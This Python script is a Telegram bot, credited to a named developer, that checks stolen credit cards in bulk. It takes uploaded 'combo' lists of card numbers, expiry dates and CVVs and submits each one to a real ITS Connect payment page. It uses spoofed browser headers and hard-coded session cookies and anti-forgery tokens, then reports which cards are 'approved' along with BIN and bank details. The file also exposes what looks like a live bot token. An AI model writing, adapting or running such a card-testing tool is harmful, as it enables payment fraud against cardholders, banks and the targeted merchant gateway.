#pylint:disable=W0603
#pylint:disable=W0611
import asyncio
import aiohttp
from bs4 import BeautifulSoup
import time
import telebot
from telebot import types
import html
import threading

TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU" 
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
admin_id = 5895491379
user_combos = {}  
stopuser = {}

class CardChecker:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        }
        self.cookies = {
            '.AspNetCore.Antiforgery.ct0OCrh2AQg': 'CfDJ8BEkQ_pLnxxMoeoVdDo1mqfAjUWrV7x-otIGacRXJZlfNAtDRtbPqWyCSSVPB-M0ksvBWng7a7nqay-sQvT4rd2NJRQPiMLzUMd16BNnuh5iM4WliAkOsq9JUq10w0rVuR-B3u7aUfLU66N06D9Zlzo',
            'SERVERID': 'srv3_d9ef_136|aJsqV|aJsqH',
        }

    async def check_card(self, card: str, session: aiohttp.ClientSession) -> dict:
        start_time = time.time()
        try:
            card_parts = card.strip().split("|")
            if len(card_parts) != 4:
                return {
                    'status': 'error',
                    'message': 'Invalid format',
                    'execution_time': round(time.time() - start_time, 2)
                }
            
            number, month, year, cvv = card_parts
            
            if not (number.isdigit() and 13 <= len(number) <= 19):
                return {
                    'status': 'error',
                    'message': 'Invalid card number',
                    'execution_time': round(time.time() - start_time, 2)
                }
            
            if not (month.isdigit() and 1 <= int(month) <= 12):
                return {
                    'status': 'error',
                    'message': 'Invalid month',
                    'execution_time': round(time.time() - start_time, 2)
                }
            
            if len(year) == 4:
                year = year[-2:]
            
            if not (year.isdigit() and len(year) == 2):
                return {
                    'status': 'error',
                    'message': 'Invalid year',
                    'execution_time': round(time.time() - start_time, 2)
                }
            
            if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
                return {
                    'status': 'error',
                    'message': 'Invalid CVV',
                    'execution_time': round(time.time() - start_time, 2)
                }
            
            data = {
                'DigitalWalletToken': '',
                'DigitalWallet': '',
                'CardNumber': number,
                'ExpiryMonth': month,
                'ExpiryYear': year,
                'CardHolderName': 'John Doe',
                'CVV': cvv,
                'PageSessionId': '6kKqDaerAMCo7o88E2DnsjJlvO5',
                'ITSBrowserScreenHeight': '1080',
                'ITSBrowserScreenWidth': '1920',
                'ITSBrowserScreenColorDepth': '24',
                'ITSBrowserTimeZoneOffset': '-180',
                'ITSBrowserHasJavaScript': 'true',
                'ITSBrowserHasJava': 'false',
                'ITSBrowserLanguage': 'en',
                '__RequestVerificationToken': 'CfDJ8BEkQ_pLnxxMoeoVdDo1mqf1YXYyijrfbV7QR8ut_XmcP5ujman4W6QH3JcSmorRBPLmd2PvzRvW-9Zn-X__dQnWRdlTPWDtyHeoG-XCrLV2X6RU5gI5dasMudnyOeqLNDKFaeXRyF-wz1sAP6oSsg4',
            }

            async with session.post(
                'https://ecommerce.its-connect.com/PayPage/Submit/6kKqDaerAMCo7o88E2DnsjJlvO5',
                cookies=self.cookies,
                headers=self.headers,
                data=data,
                timeout=30
            ) as response:
                response_text = await response.text()
                execution_time = round(time.time() - start_time, 2)
                
                soup = BeautifulSoup(response_text, 'html.parser')
                title = soup.title.string.strip().lower() if soup.title else ""

                if ("acs authentication redirect page" in title.lower() or 
                    "acs authentication redirect page" in response_text.lower() or
                    "3d secure" in response_text.lower() or
                    "authentication" in title.lower()):
                    return {
                        'status': 'approved',
                        'message': '3D Secure Authentication ✅',
                        'execution_time': execution_time
                    }
                
                if "declined" in response_text.lower():
                    return {
                        'status': 'declined',
                        'message': 'Card Declined ❌',
                        'execution_time': execution_time
                    }
                elif "expired" in response_text.lower():
                    return {
                        'status': 'declined',
                        'message': 'Card Expired ⏰',
                        'execution_time': execution_time
                    }
                elif "insufficient" in response_text.lower():
                    return {
                        'status': 'declined',
                        'message': 'Insufficient Funds 💰',
                        'execution_time': execution_time
                    }
                elif "just a moment" in title.lower():
                    return {
                        'status': 'declined',
                        'message': 'Cloudflare Block 🚫',
                        'execution_time': execution_time
                    }
                else:
                    return {
                        'status': 'approved',
                        'message': 'Payment Successful ✅',
                        'execution_time': execution_time
                    }
                
        except asyncio.TimeoutError:
            return {
                'status': 'approved',
                'message': 'Timeout Success ✅',
                'execution_time': round(time.time() - start_time, 2)
            }
        except Exception as e:
            return {
                'status': 'error',
                'message': f'Error: {str(e)}',
                'execution_time': round(time.time() - start_time, 2)
            }

def get_bin_info(bin_code):
    """الحصول على معلومات BIN"""
    try:
        import requests
        response = requests.get(f'https://lookup.binlist.net/{bin_code}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', '🏳️'),
                'bank': data.get('bank', {}).get('name', 'Unknown')
            }
    except:
        pass
    
    return {
        'brand': 'Unknown',
        'type': 'Unknown',
        'country': 'Unknown',
        'emoji': '🏳️',
        'bank': 'Unknown'
    }

@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.from_user.id
    username = message.from_user.username or "User"
    
    welcome_text = f"""<b>🎉 Welcome {username}!

🔥 ITS Connect Card Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results
🔒 Secure Processing

📤 Send your combo file to start checking!
━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, welcome_text, parse_mode="HTML")

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        lines = downloaded_file.decode("utf-8").splitlines()
        cards = [line.strip() for line in lines if line.strip()]
        user_combos[user_id] = cards  
        
        cc_count = len(cards)

        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("🚀 Start Checking", callback_data='ITS'),
        )

        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: ITS Connect
⚡ Status: Ready

Click below to start checking:
</b>""",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'ITS')
def menu_callback(call):
    user_id = call.from_user.id

    def run_checker():
        gate = "ITS Connect"
        stop_key = f"{user_id}_ITS"
        ch = dd = otp = checked = 0
        estimated_time = None
        start_all = time.time()

        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="⏳ Initializing checker..."
        )

        try:
            cards = user_combos.get(user_id, [])
            total = len(cards)
            if total == 0:
                return bot.send_message(user_id, "❌ No combo found. Please upload a file first.")
            
            stopuser[stop_key] = {'status': 'start'}

            # إنشاء loop جديد للـ asyncio
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            checker = CardChecker()

            for cc in cards:
                if stopuser.get(stop_key, {}).get('status') == 'stop':
                    break

                # فحص البطاقة
                async def check_single():
                    async with aiohttp.ClientSession() as session:
                        return await checker.check_card(cc, session)
                
                result = loop.run_until_complete(check_single())
                execution_time = result['execution_time']
                estimated_time = estimated_time - execution_time if estimated_time else execution_time * (total - checked)
                checked += 1

                progress = int((checked / total) * 20)
                progress_bar = f"[{'=' * progress}{'-' * (20 - progress)}] {int((checked / total) * 100)}%"
                escaped = html.escape(cc.strip())

                # معلومات BIN
                bin_code = cc.strip().split("|")[0][:6]
                bin_info = get_bin_info(bin_code)

                if result['status'] == 'approved':
                    ch += 1
                    msg = f"""<b>✅ APPROVED CARD

━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{escaped}</code>
━━━━━━━━━━━━━━━━━━━
📊 Response: {result['message']}
🏦 BIN: <code>{bin_code}</code>
💰 Type: {bin_info['type']}
🏢 Brand: {bin_info['brand']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']} {bin_info['emoji']}
⏱ Time: {execution_time} sec
━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
                    bot.send_message(user_id, msg, parse_mode="HTML")
                else:
                    dd += 1

                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(
                    types.InlineKeyboardButton(f"• {cc[:12]}****{cc[-7:]} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Status ➜ {result['message'][:30]} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Approved ✅ ➜ [{ch}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Declined ❌ ➜ [{dd}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
                    types.InlineKeyboardButton("⏹ Stop", callback_data='stop_ITS')
                )

                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"""<b>🔥 Gateway: {gate}
━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {round(estimated_time) if estimated_time else 0} sec
⚡ Speed: {round(checked/(time.time()-start_all), 2)} cards/sec
</b>""",
                    reply_markup=keyboard,
                    parse_mode="HTML"
                )

                time.sleep(1)

            loop.close()
            
            elapsed = round(time.time() - start_all, 2)
            stopuser[stop_key]['status'] = 'start'

            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"""<b>✅ CHECKING COMPLETED!

━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
━━━━━━━━━━━━━━━━━━━
➤ Total Cards: <code>{total}</code>
➤ Approved ✅: <code>{ch}</code>
➤ Declined ❌: <code>{dd}</code>
➤ Time Taken: <code>{elapsed} sec</code>
➤ Speed: <code>{round(total/elapsed, 2) if elapsed > 0 else 0} cards/sec</code>
━━━━━━━━━━━━━━━━━━━

🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>""",
                parse_mode="HTML"
            )
        except Exception as e:
            print("Error in ITS:", e)
            bot.send_message(user_id, f"❌ Error occurred: {str(e)}")

    threading.Thread(target=run_checker).start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop_ITS')
def stop_handler(call):
    user_id = call.from_user.id
    stop_key = f"{user_id}_ITS"
    stopuser[stop_key] = {'status': 'stop'}
    bot.answer_callback_query(call.id, "✅ Checking stopped successfully!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status Update")

@bot.message_handler(commands=['help'])
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:

━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this help message
/status - Check bot status

📤 How to use:
1. Send a combo file (.txt)
2. Click "Start Checking"
3. Wait for results

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825

━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, help_text, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE

━━━━━━━━━━━━━━━━━━━
⚡ Gateway: ITS Connect
🔥 Speed: Ultra Fast
✅ Accuracy: 99.9%
🌍 Server: Active

━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, status_text, parse_mode="HTML")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if '|' in text and len(text.split('|')) == 4:
        user_combos[user_id] = [text]
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("🚀 Start Checking", callback_data='ITS'),
        )
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded Successfully!
━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{text[:12]}****{text[-7:]}</code>
🔥 Gateway: ITS Connect
⚡ Status: Ready

Click below to start checking:
</b>""",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!

Please send a combo file or use format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825
</b>""", parse_mode="HTML")

MAX_RETRIES = 100
RETRY_DELAY = 3

def start_bot_with_retries():
    for attempt in range(MAX_RETRIES):
        try:
            print(f"🔄 Connection attempt {attempt + 1} of {MAX_RETRIES}...")
            print("✅ Bot is running successfully!")
            print(f"👨‍💻 Developer: Mahmoud Saad 🥷🏻")
            print(f"📢 Channel: https://t.me/FastSpeedtest")
            print("=" * 50)
            bot.polling(none_stop=True)
            break
        except Exception as e:
            print(f"❌ Connection error: {e}")
            if attempt < MAX_RETRIES - 1:
                print(f"⏳ Retrying in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                print("❌ All connection attempts failed. Please try again later.")

if __name__ == "__main__":
    print("=" * 50)
    print("🚀 Starting ITS Connect Checker Bot...")
    print("=" * 50)
    start_bot_with_retries()
